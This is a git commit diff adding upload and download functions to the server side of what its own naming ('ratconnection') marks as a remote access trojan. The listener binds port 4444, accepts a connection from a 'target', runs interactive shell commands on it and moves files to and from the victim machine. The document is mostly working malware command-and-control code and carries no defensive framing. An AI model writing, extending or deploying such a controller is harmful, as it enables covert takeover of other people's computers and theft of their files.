7c342ca52be53119a59c14988d2e85126d82b368
Samuel <kamarsamuel9@gmail.com>
2022-08-10 16:44:50 -0400

    Added Upload/Download Fuctions and Fixed some timeout issues

--- server.py
+++ server.py
@@ -2,25 +2,49 @@ import socket
 import json
 import os
 
-
+#send command to target
 def send_command(command):
 	command_dump = json.dumps(command)
 	ratconnection.send(command_dump.encode())
 
+#receives command output from target
 def get_response():
 	output = ratconnection.recv(1024).decode()
 	return json.loads(output)
 
 
+#upload file to target machine
+def send_file(file_name):
+	with open(file_name, 'rb')as file:
+		ratconnection.send(file.read())
+	print("[+] {} uploaded".format(file_name))
 
-def communicationchannel():
+def get_file(file_name):
+	ratconnection.settimeout(5)
+	with open(file_name, 'wb')as file:
+		while True:
+			try:
+				fragment = ratconnection.recv(1024)
+				file.write(fragment)
+			except:
+				break
+	ratconnection.settimeout(None)
+	print("[+] {} downloaded".format(file_name))
+
+
+#Main function 
+def communicationchannel(ip):
 	while True:
-		command = input("Shell ~ ")
+		command = input("$ Shell{}: ".format(str(ip)))
 		send_command(command)
 		if command == 'quit':
 			break
-		elif 'cd' in command:
+		elif command[:3] == 'cd ':
 			pass
+		elif command[:8] == 'download':
+			get_file(command[9:])
+		elif command[:6] == 'upload':
+			send_file(command[7:])
 		elif command == 'clear':
 			os.system('cls')
 		else:
@@ -28,10 +52,11 @@ def communicationchannel():
 			print(result)
 
 
-soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 soc.bind(("10.0.0.171",4444))
+print("[+] Listening for connection")
 soc.listen(5)
 ratconnection, ip = soc.accept()
-print("[+] connected to " + str(ip))
-communicationchannel()
+print("[+] Connected to " + str(ip))
+communicationchannel(ip)
